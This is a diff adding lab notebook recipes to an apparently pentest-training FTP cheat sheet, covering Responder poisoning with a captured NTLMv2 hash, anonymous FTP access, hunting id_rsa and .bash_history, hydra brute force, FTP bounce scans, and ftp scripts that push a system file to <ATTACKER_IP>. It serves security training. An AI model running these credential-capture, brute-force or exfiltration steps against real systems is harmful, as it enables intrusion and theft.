@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=ftp) · [All tools](/index)
+
 ## Commands
 
 **Kali / FTP prompt**
@@ -26,8 +28,334 @@ put file.zip
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=ftp)
+## Notebook recipes
 
-## Learning and original examples
+19 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [FTP Enumeration and File Access](/enumeration/ftp-enumeration-file-transfer-protocol)
+<AccordionGroup>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo responder -I ens33
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.198]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-2TY1Z1CIGXH]
+    Responder Domain Name      [HF2L.LOCAL]
+    Responder DCE-RPC Port     [48162]
+
+[+] Listening for events...
+
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
+```
+
+</Accordion>
+
+<Accordion title="Misconfigurations">
+
+### Misconfigurations
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ ftp 192.168.2.142
+
+Connected to 192.168.2.142.
+220 (vsFTPd 2.3.4)
+Name (192.168.2.142:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
+226 Directory send OK.
+```
+
+</Accordion>
+
+<Accordion title="Enumeration workflow">
+
+### Enumeration workflow
+
+**FTP Enumeration and File Access**
+
+```bash
+ftp <IP>                       # connect
+# once logged in:
+ls            # list files — but this hides dotfiles
+ls -la        # ALWAYS do this — reveals hidden files like .ssh, .bash_history
+pwd           # where am I
+cd <dir>      # navigate
+get <file>    # download one file
+mget *        # download everything in the current dir
+binary        # switch to binary mode before pulling non-text files (images, archives, keys)
+lcd /tmp      # set the LOCAL download directory (fixes "Permission denied" on download)
+put <file>    # UPLOAD a file (if you have write access — see below)
+bye           # quit
+```
+
+**FTP Enumeration and File Access**
+
+```bash
+wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole server
+```
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: Always  ls -la .  A directory that looks empty with  ls  often hides a  .ssh  folder with  id_rsa , or a  .bash_history  leaking commands and passwords.
+
+```text
+ls -la
+```
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: If  get  fails with "Permission denied," it's a  local  problem  — your client can't write to the current local folder. Run  lcd /tmp  first, then download.
+
+```text
+lcd /tmp
+```
+
+</Accordion>
+
+<Accordion title="The big win: anonymous login">
+
+### The big win: anonymous login
+
+**FTP Enumeration and File Access**
+
+```bash
+ftp <IP>
+# Username: anonymous
+# Password: (anything, e.g. anonymous@ or just press Enter)
+```
+
+**FTP Enumeration and File Access**
+
+```bash
+nmap -p21 -sV -sC <IP>                          # banner + ftp-anon script (detects anonymous login)
+nmap -p21 --script ftp-anon,ftp-syst <IP>       # anon access + system type
+```
+
+</Accordion>
+
+<Accordion title="When there&#x27;s no anonymous access: brute force">
+
+### When there's no anonymous access: brute force
+
+**FTP Enumeration and File Access**
+
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>
+hydra -L users.txt -P passwords.txt -t 4 <IP> ftp -V
+```
+
+</Accordion>
+
+<Accordion title="FTP Downloads">
+
+### FTP Downloads
+
+**File Transfers for Linux and Windows**
+
+```cmd
+echo open <ATTACKER_IP> > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+</Accordion>
+
+<Accordion title="FTP Uploads">
+
+### FTP Uploads
+
+**File Transfers for Linux and Windows**
+
+```cmd
+echo open <ATTACKER_IP> > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+</Accordion>
+
+<Accordion title="FTP (Port 21)">
+
+### FTP (Port 21)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect
+ftp <IP>
+
+# Try anonymous login
+# Username: anonymous  Password: (blank or any email)
+
+# Commands once inside
+ls              # list files (may show empty)
+ls -la          # show hidden files — ALWAYS DO THIS
+pwd             # current directory
+cd .ssh         # navigate to interesting dirs
+get id_rsa      # download files
+lcd /tmp        # change LOCAL download dir (if permission denied)
+```
+
+</Accordion>
+
+<Accordion title="Service deep-dive gaps (your &quot;explain all services&quot; ask)">
+
+### Service deep-dive gaps (your "explain all services" ask)
+
+**CPTS Coverage Audit: Historical Snapshot**
+
+Context from the notebook: FTP (21)  —  FTP Enumeration (File Transfer Protocol)  — two-connection design, active vs passive, anonymous login, writable-root→webshell, bounce.
+
+```text
+FTP Enumeration (File Transfer Protocol)
+```
+
+</Accordion>
+
+<Accordion title="Attack angles beyond reading files">
+
+### Attack angles beyond reading files
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: FTP bounce attack ( PORT ).  Legacy servers can be abused to make the  server  connect to a third host, using it as a proxy to scan/reach internal systems otherwise unreachable from you ( nmap -b ). Rare today, but it's the historical reason active mode is dangerous.
+
+```text
+nmap -b
+```
+
+</Accordion>
+
+<Accordion title="How FTP actually works">
+
+### How FTP actually works
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: The  control connection  (TCP 21) carries commands and responses —  USER ,  PASS ,  LIST ,  RETR , and the server's numeric reply codes ( 230 Login successful ,  550 Permission denied ). This connection stays open for the whole session.
+
+```text
+230 Login successful
+```
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: The  control connection  (TCP 21) carries commands and responses —  USER ,  PASS ,  LIST ,  RETR , and the server's numeric reply codes ( 230 Login successful ,  550 Permission denied ). This connection stays open for the whole session.
+
+```text
+550 Permission denied
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: First move ftp &lt;IP>  → try  anonymous  / any password;  nmap --script ftp-anon
+
+```text
+ftp <IP>
+```
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: First move ftp &lt;IP>  → try  anonymous  / any password;  nmap --script ftp-anon
+
+```text
+nmap --script ftp-anon
+```
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: No anon? hydra ... ftp://&lt;IP>
+
+```text
+hydra ... ftp://<IP>
+```
+
+</Accordion>
+
+</AccordionGroup>
